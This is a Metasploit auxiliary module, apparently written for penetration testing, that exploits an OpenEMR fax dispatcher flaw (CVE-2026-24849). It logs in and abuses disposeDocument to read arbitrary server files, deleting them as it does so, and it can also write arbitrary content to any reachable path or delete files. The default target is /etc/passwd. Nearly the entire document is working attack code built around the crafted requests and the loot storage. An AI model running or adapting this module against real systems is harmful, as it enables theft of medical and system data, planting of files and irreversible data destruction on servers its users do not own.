##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'OpenEMR RCFaxClient disposeDocument Arbitrary File Read/Write/Delete',
        'Description'    => %q{
          OpenEMR's RCFaxClient class extends AppDispatch and exposes a public
          disposeDocument() method with no required parameters.  Any authenticated
          user can invoke it via the FaxSMS dispatcher (_ACTION_COMMAND=disposeDocument,
          type=rcfax).

          The method accepts three request parameters:
            file_path  - server-side path to target
            content    - optional base64 payload (for write)
            action     - "setup" (read path or write) / "download" (read + delete)

          When action=download, the method calls sendFile() to return the file content
          in the HTTP response and then calls unlink() on the same path, creating a
          combined read-and-delete primitive not present in the EtherFaxActions sibling
          (CVE-2026-24849).

          This module supports three actions:
            READ   - exfiltrate an arbitrary file (WARNING: also deletes it, see Notes)
            WRITE  - write arbitrary content to any path the web-server user can reach
            DELETE - explicitly delete a file (no content returned)
        },
        'License'        => MSF_LICENSE,
        'Author'         => ['Anonymous Author'],
        'References'     => [
          ['CVE',  '2026-24849'],
          ['GHSA', 'GHSA-w6vc-hx2x-48pc']
        ],
        'DisclosureDate' => '2026-01-15',
        'Actions'        => [
          ['READ',   { 'Description' => 'Read (and delete) an arbitrary file from the server' }],
          ['WRITE',  { 'Description' => 'Write arbitrary content to a server-side path' }],
          ['DELETE', { 'Description' => 'Delete an arbitrary file (no content returned)' }]
        ],
        'DefaultAction' => 'READ',
        'Notes' => {
          'Stability'    => [CRASH_SAFE],
          'Reliability'  => [REPEATABLE_SESSION],
          'SideEffects'  => [ARTIFACTS_ON_DISK, IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(8080),
      OptString.new('TARGETURI',    [true,  'Base path to OpenEMR',                     '/']),
      OptString.new('USERNAME',     [true,  'OpenEMR username',                          'admin']),
      OptString.new('PASSWORD',     [true,  'OpenEMR password',                          '']),
      OptString.new('SITE',         [true,  'OpenEMR site identifier',                   'default']),
      OptString.new('FILEPATH',     [true,  'Absolute server-side file path to target',  '/etc/passwd']),
      OptString.new('WRITECONTENT', [false, 'Raw content to write (plain text)',         ''])
    ])
  end

  # -------------------------------------------------------------------------
  # Helpers
  # -------------------------------------------------------------------------

  def dispatcher_uri
    normalize_uri(
      target_uri.path,
      'interface', 'modules', 'custom_modules',
      'oe-module-faxsms', 'index.php'
    )
  end

  def login
    res = send_request_cgi(
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'interface', 'main', 'main_screen.php'),
      'vars_get'  => { 'auth' => 'login', 'site' => datastore['SITE'] },
      'vars_post' => {
        'authUser'     => datastore['USERNAME'],
        'clearPass'    => datastore['PASSWORD'],
        'authProvider' => 'Default'
      }
    )
    return nil unless res

    cookie = res.get_cookies
    cookie.empty? ? nil : cookie
  end

  def dispatcher_request(cookie, extra_get: {}, extra_post: {})
    base_get = {
      'site'             => datastore['SITE'],
      'type'             => 'rcfax',
      '_ACTION_COMMAND'  => 'disposeDocument'
    }.merge(extra_get)

    opts = {
      'uri'       => dispatcher_uri,
      'cookie'    => cookie,
      'vars_get'  => base_get
    }

    if extra_post.empty?
      opts['method'] = 'GET'
    else
      opts['method']    = 'POST'
      opts['vars_post'] = extra_post
    end

    send_request_cgi(opts)
  end

  # -------------------------------------------------------------------------
  # Check
  # -------------------------------------------------------------------------

  def check
    cookie = login
    return Msf::Exploit::CheckCode::Unknown('Login failed -- check credentials') unless cookie

    res = dispatcher_request(
      cookie,
      extra_get: { 'file_path' => datastore['FILEPATH'], 'action' => 'setup' }
    )
    return Msf::Exploit::CheckCode::Unknown('No response from target') unless res

    if res.code == 200 && res.body.include?('"success"')
      return Msf::Exploit::CheckCode::Vulnerable(
        'RCFaxClient::disposeDocument() is dispatcher-reachable; ' \
        'target responded with JSON envelope'
      )
    end

    Msf::Exploit::CheckCode::Safe("Unexpected response: HTTP #{res.code}")
  end

  # -------------------------------------------------------------------------
  # Actions
  # -------------------------------------------------------------------------

  def run
    cookie = login
    fail_with(Failure::NoAccess, 'Login failed -- check credentials') unless cookie

    case action.name
    when 'READ'   then do_read(cookie)
    when 'WRITE'  then do_write(cookie)
    when 'DELETE' then do_delete(cookie)
    end
  end

  def do_read(cookie)
    print_warning(
      'action=download in RCFaxClient calls unlink() after sendFile(); ' \
      'the remote file WILL be deleted once read.'
    )

    res = dispatcher_request(
      cookie,
      extra_get: { 'file_path' => datastore['FILEPATH'], 'action' => 'download' }
    )
    fail_with(Failure::UnexpectedReply, 'No response') unless res
    fail_with(Failure::UnexpectedReply, "HTTP #{res.code}") if res.code != 200

    body = res.body
    if body.empty?
      print_error('Empty response body -- file may not exist or is unreadable')
      return
    end

    print_good("Read #{body.length} bytes from #{datastore['FILEPATH']}")
    print_good('Remote copy deleted by unlink() after sendFile().')
    loot_path = store_loot(
      'openemr.rcfax.file_read',
      'text/plain',
      rhost,
      body,
      ::File.basename(datastore['FILEPATH']),
      "OpenEMR RCFaxClient disposeDocument file read: #{datastore['FILEPATH']}"
    )
    print_good("Saved to loot: #{loot_path}")
  end

  def do_write(cookie)
    raw = datastore['WRITECONTENT']
    fail_with(Failure::BadConfig, 'Set WRITECONTENT for the WRITE action') if raw.to_s.empty?

    encoded = Rex::Text.encode_base64(raw)

    res = dispatcher_request(
      cookie,
      extra_post: {
        'file_path' => datastore['FILEPATH'],
        'content'   => encoded,
        'action'    => 'setup'
      }
    )
    fail_with(Failure::UnexpectedReply, 'No response') unless res

    begin
      parsed = JSON.parse(res.body)
    rescue JSON::ParserError
      fail_with(Failure::UnexpectedReply, "Non-JSON response: #{res.body[0, 200]}")
    end

    if parsed['success']
      print_good("File written: #{parsed['url']} (#{raw.length} bytes)")
    else
      print_error("Write failed: #{parsed['message']}")
    end
  end

  def do_delete(cookie)
    print_warning(
      "Deleting #{datastore['FILEPATH']} -- this action is irreversible."
    )

    res = dispatcher_request(
      cookie,
      extra_get: { 'file_path' => datastore['FILEPATH'], 'action' => 'download' }
    )
    fail_with(Failure::UnexpectedReply, 'No response') unless res

    if res.code == 200
      print_good(
        "disposeDocument() invoked with action=download; " \
        "#{datastore['FILEPATH']} sent to client then unlinked server-side."
      )
    else
      print_error("Unexpected HTTP #{res.code}: #{res.body[0, 200]}")
    end
  end
end
